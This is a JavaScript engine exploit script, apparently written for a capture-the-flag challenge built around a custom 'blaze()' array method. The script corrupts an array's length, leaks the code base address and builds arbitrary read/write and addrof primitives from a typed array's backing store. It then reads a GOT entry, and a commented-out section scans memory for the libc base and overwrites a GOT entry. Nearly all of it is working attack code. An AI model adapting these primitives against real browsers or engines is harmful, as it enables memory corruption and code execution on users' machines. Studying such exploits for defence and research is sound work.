load('utils.js');
load('int64.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

const a1 = new Array(1, 2, 3, 4);
const a2 = new Uint8Array(8);
let c = a1.blaze()

let typed_array_backstore = a1[13];
let code_base = ftoi(a1[8]) - 0x110f6c8n;
console.log("[+] code segment leaked: 0x"+code_base.toString(16));

function arb_read(addr, size) {
	a1[13] = itof(addr)
	return a2.slice(0, size);
}

function arb_write(addr, value) {
	a1[13] = itof(addr);
	a2.set(itof(value));
}

function addrof(obj) {
	a1[13] = typed_array_backstore;
	a1[14] = obj;
	return a2.slice(0, 8);
}

let first_got_entry_addr = code_base + 0x21bd8e0n;
let first_got_entry = Int64.fromJSValue(arb_read(first_got_entry_addr, 8));

console.log("[+] first GOT entry addr:\t0x"+first_got_entry_addr.toString(16));
console.log("[+] first GOT entry value:\t0x"+first_got_entry.toString(16));

var libc_base = 0;
var libc_header = 0;
var i = 0;
var delta = BigInt(0x1000 * 65);

first_got_entry_delta = first_got_entry % Math.pow(2,8);
first_got_entry = BigInt(first_got_entry - first_got_entry_delta);
console.log("[+] Attempting to find libc base");
console.log("\t- Starting from address: 0x" + (first_got_entry).toString(16));
/*
for (var x=0; x < 10; x++) {
	delta = delta + 0x1000n;
	libc_header = arb_read(BigInt(first_got_entry-delta), 8);	
	if (Int64.fromJSValue(libc_header) == 0x00000102464c457f) {
		libc_base = first_got_entry-delta;
		break;
	}
}

if (libc_base == 0) {
	console.log("[-] Failed to leak libc");
}

console.log("[+] libc base leaked:\t0x"+libc_base.toString(16));
arb_write(first_got_entry_addr, BigInt(0x4141414141414141n));
let new_val = arb_read(first_got_entry_addr, 8);
console.log(Int64.fromJSValue(new_val).toString(16));
*/
let obj = {hello: 0x1337};
Math.atan2(obj);
